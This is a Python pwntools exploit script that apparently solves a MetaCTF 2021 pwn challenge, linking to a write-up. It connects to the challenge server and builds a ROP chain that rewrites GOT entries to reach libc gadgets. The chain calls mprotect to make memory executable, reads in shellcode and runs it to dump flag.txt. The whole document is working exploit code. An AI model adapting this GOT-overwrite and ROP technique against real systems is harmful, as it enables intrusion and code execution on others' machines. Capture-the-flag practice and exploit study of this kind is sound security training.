#!/usr/bin/env python3
from pwn import *
def start(argv=[], *a, **kw):
    return remote("host.cg21.metaproblems.com", "3030", *a, **kw)
exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.log_level = 'info'

gadget_add = 0x401178
'''
add dword ptr [rbp - 0x3d], ebx
nop dword ptr [rax + rax]
ret
'''

gadget_pop = 0x4013f2
'''
pop rbx
pop rbp
mov r12, [rsp+8+var_8]
add rsp, 8
ret
'''

pop_rbp = 0x401179

def add_addr(addr, val):
  payload = flat({
  0: [
    gadget_pop,
    val&0xffffffff, # 32 bit rbx = ebx
    addr+0x3d,
    0, # because add rsp, 8
    gadget_add,
  ]
  })
  return payload

# libc gadget
gadget3 = 0x8ff1d # pop rdi ; ret
gadget4 = 0x8ef1b # pop rdx ; ret
gadget5 = 0x66337 # or esi, edx; movd xmm0, esi; ret;
gadget6 = 0x4f549 # xchg eax, esi; ret;
gadget7 = 0x6991a # mov rax, rbp; pop rbp; ret;
gadget8 = 0x9cfc2 # syscall; ret;

io = start()

payload = flat({
  16:[
    # change __isoc99_scanf to gadget3
    gadget3 - libc.symbols['__isoc99_scanf'],
    p64(0)*2,
    pop_rbp,
    elf.got['__isoc99_scanf'] + 0x3d,
    gadget_add,

    # change setvbuf to gadget7
    add_addr(elf.got['setvbuf'], gadget7 - libc.sym['setvbuf']),
    # set rbp=0x1000
    pop_rbp, 0x1000,
    # ser rax = rbp
    elf.sym['setvbuf'], 0,
    # change setvbuf to gadget6
    add_addr(elf.got['setvbuf'], gadget6 - gadget7),
    # set esi = eax = 0x1000
    elf.sym['setvbuf'],

    # change setvbuf to gadget4
    add_addr(elf.got['setvbuf'], (gadget4-gadget6)),
    # set rdi = 0x404000 ,  then  set rdx = 7
    elf.symbols['__isoc99_scanf'], 0x404000,
    elf.symbols['setvbuf'], 7,

    # change __isoc99_scanf to gadget7
    add_addr(elf.got['__isoc99_scanf'], (gadget7-gadget3)),
    # set rbp=10  then rax=rbp
    pop_rbp, 10,
    elf.symbols['__isoc99_scanf'], 0,

    # change __isoc99_scanf to gadget8
    add_addr(elf.got['__isoc99_scanf'], (gadget8-gadget7)),
    # syscall -> mprotect(0x404000, 0x1000, 7) --> set bss to RWX
    elf.symbols['__isoc99_scanf'],

    # change __isoc99_scanf to gadget3
    add_addr(elf.got['__isoc99_scanf'], (gadget3-gadget8)),
    # set rdi = 0
    elf.symbols['__isoc99_scanf'], 0,

    # change __isoc99_scanf to gadget7
    add_addr(elf.got['__isoc99_scanf'], (gadget7-gadget3)),
    # set rbp = 0x404800, then rax = rbp
    pop_rbp, 0x404800,
    elf.symbols['__isoc99_scanf'], 0,

    # change __isoc99_scanf to gadget6
    add_addr(elf.got['__isoc99_scanf'], (gadget6-gadget7)),
    # set rsi = 0x404800
    elf.symbols['__isoc99_scanf'],

    # change __isoc99_scanf to gadget4
    add_addr(elf.got['__isoc99_scanf'], (gadget4-gadget6)),
    # set rdx = 0x100
    elf.symbols['__isoc99_scanf'], 0x100,

    # change __isoc99_scanf to gadget7
    add_addr(elf.got['__isoc99_scanf'], (gadget7-gadget4)),
    # set rbp = 0 ,  then rax = rbp
    pop_rbp, 0,
    elf.symbols['__isoc99_scanf'], 0,

    # change __isoc99_scanf to gadget8
    add_addr(elf.got['__isoc99_scanf'], (gadget8-gadget7)),
    # syscall -->  read(0, 0x404800, 0x100)
    elf.symbols['__isoc99_scanf'],
    # jump to our shellcode
    0x404800,
  ]
})
io.sendlineafter('bytes?\n', str(len(payload)))
io.send(payload)

io.send(asm(shellcraft.readfile('./flag.txt',1)))

io.stream()
# https://github.com/nobodyisnobody/write-ups/tree/main/MetaCtf.2021/pwn/A.Attempt.Was.Made
